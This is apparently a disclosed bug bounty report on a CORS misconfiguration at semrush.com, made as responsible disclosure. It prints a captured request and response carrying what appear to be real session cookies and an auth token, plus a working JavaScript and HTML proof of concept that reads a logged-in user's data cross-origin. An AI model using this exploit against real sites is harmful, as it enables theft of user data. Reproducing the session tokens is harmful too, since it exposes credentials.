# Cross-origin resource sharing misconfig | steal user information 

## Report Details
- **Report ID**: 235200
- **URL**: https://hackerone.com/reports/235200
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2017-06-01T01:44:03.428Z
- **Disclosed**: 2017-12-17T01:33:19.703Z

## Reporter
- **Username**: bughuntermate
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: semrush

## Vulnerability Information
Man, treat you another drink.


## Description

An HTML5 cross-origin resource sharing (CORS) policy controls whether and how content running on other domains can perform two-way interaction with the domain that publishes the policy. The policy is fine-grained and can apply access controls per-request based on the URL and other features of the request.
Trusting arbitrary origins effectively disables the same-origin policy, allowing two-way interaction by third-party web sites. Unless the response consists only of unprotected public content, this policy is likely to present a security risk.
If the site specifies the header Access-Control-Allow-Credentials: true, third-party sites may be able to carry out privileged actions and retrieve sensitive information. Even if it does not, attackers may be able to bypass any IP-based access controls by proxying through users' browsers.

##POC1
**Request**
```
GET /organic-traffic-insights/api/rest/1.2/users/███/projects?_=1496248656402 HTTP/1.1
Host: www.semrush.com
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:53.0) Gecko/20100101 Firefox/53.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.5
Referer: https://www.semrush.com/projects/
X-Requested-With: XMLHttpRequest
Cookie: wp13557="UWYYADs-TTTW:WWLHWYDtlnDl-TJIH-UYUTDDDIALHUZDLZTAHTIV-CCAY-XMLT-IUUA-UYUBWXWZACCWDlLtkNlo_Jht"; ref_code=__default__; usertype=Free-User; marketing=%7B%22user_cmp%22%3A%22%22%2C%22user_label%22%3A%22%22%7D; localization=%7B%22locale%22%3A%22en%22%2C%22db%22%3A%22sg%22%7D; db_date=current; userdata=%7B%22tz%22%3A%22GMT+8%22%2C%22ol%22%3A%22en%22%7D; _ga=GA1.2.412244322.1496213122; _gid=GA1.2.1937633003.1496213122; visit_first=1496213122000; __uvt=; uvts=65OAcWY4QhJHESTs; referer_purchase=https%3A%2F%2Fes.semrush.com%2Fdashboard%2F; sct:feedback:show=false; __insp_uid=2126149429; temp_db_but=sg; db=us; exp_feature_popup_closed=yes; about_sessionid=gue5yj2t8bmucnlwuv1y1cxilq7a7q8g; about_csrf=i6C8isOR7WLuVa1348FSsPH6rXzVEQSr; n_userid=LuWhoFku7Ou4q2PeBHIUAg==; __zlcmid=gngUE7HFajaRsy; _bizo_bzid=ec0d2554-575b-420b-b404-51b70939ec49; _bizo_cksm=34222E182676EC07; _bizo_np_stats=155%3D338%2C; auth_token=CMFMT27JhWR9cnbkoV1dHvFaxc4tQ3f0B4IAw5BfTOjyeKeF9FKx8w2kpiLl; __insp_wid=1632961932; __insp_slim=1496248714271; __insp_nv=false; __insp_targlpu=aHR0cHM6Ly93d3cuc2VtcnVzaC5jb20vcHJvamVjdHMvIzgwMDEyMi92aWV3Lw%3D%3D; __insp_targlpt=U0VNcnVzaA%3D%3D; __insp_norec_howoften=true; __insp_norec_sess=true; org.springframework.web.servlet.i18n.CookieLocaleResolver.LOCALE=en; connect.sid=s%253A4cV9yXJcfQFXmC65JJn3KSP6Wp184s10.vGOEA1%252BgVTXbwDY4YSOkOjjnteLNyifmcQdJh8XZckI; _gat=1; _uetsid=_uetd1ba382c; JSESSIONID=4423D9EF5D5BEE794094AC0713E9EE8E; _gat_UA-6197637-22=1
Connection: close
Origin: https://itqayzlbkshw.com
```

**Response**
```
HTTP/1.1 200 
Server: nginx
Date: Thu, 01 Jun 2017 01:36:26 GMT
Content-Type: application/json;charset=UTF-8
Content-Length: 884
Connection: close
Access-Control-Allow-Origin: https://itqayzlbkshw.com
Vary: Origin
Access-Control-Allow-Credentials: true
X-XSS-Protection: 1; mode=block
X-Content-Type-Options: nosniff
Strict-Transport-Security: max-age=31536000; includeSubdomains; preload
X-Frame-Options: SAMEORIGIN

[{"key":"███","projectId":"800122","projectName":"dfsfsda","status":"NOT_AUTHORISED","authoriseUrl":"https://accounts.google.com/o/oauth2/auth?access_type=offline&approval_prompt=force&client_id=1093302022032-p190dsgnrdoavgstsem5i2pom6t9il6r.apps.googleusercontent.com&redirect_uri=http://gat.semrush.com/api/rest/1.2/auth&response_type=code&scope=https://www.googleapis.com/auth/analytics.readonly%20https://www.googleapis.com/auth/webmasters.readonly&state=█████████_800122_%5B%22https://www.googleapis.com/auth/analytics.readonly%22,%22https://www.googleapis.com/auth/webmasters.readonly%22%5D","email":null,"accounts":null,"account":null,"property":null,"view":null,"url":null,"siteUrls":null,"siteUrl":null,"database":"us","device":"desktop","totals":null,"created":null,"accountName":null,"propertyName":null,"viewName":null}]
```

Take note from request I inject a header Origin: https://itqayzlbkshw.com then from response it returns Access-Control-Allow-Origin: https://itqayzlbkshw.com. Which mean there is CORS misconfig here.

##POC 2
1. open https://example.com in browser then inspect the page and go to console.
2. run the following code in console and you would find it pops up user information
```
var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://www.semrush.com/organic-traffic-insights/api/rest/1.2/users/████/projects?_=1496248656402',true); req.withCredentials = true; req.send('{}'); function reqListener() { alert(this.responseText); };
```


##Exploit
```
<html>
<script>
var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://www.semrush.com/organic-traffic-insights/api/rest/1.2/users/███/projects?_=1496248656402',true); req.withCredentials = true; req.send('{}'); function reqListener() { alert(this.responseText); };
</script>
</html>
```

Open above code in any browser and you would find it pops up user information like the attachment.

##Comment
Attacker would treat many victims to visit attacker's website, if victim is logged in, then his personal information is recorded in attacker's server

## How to fix 
Rather than using a wildcard or programmatically verifying supplied origins, use a whitelist of trusted domains.



 

## Attachments
- cors.PNG
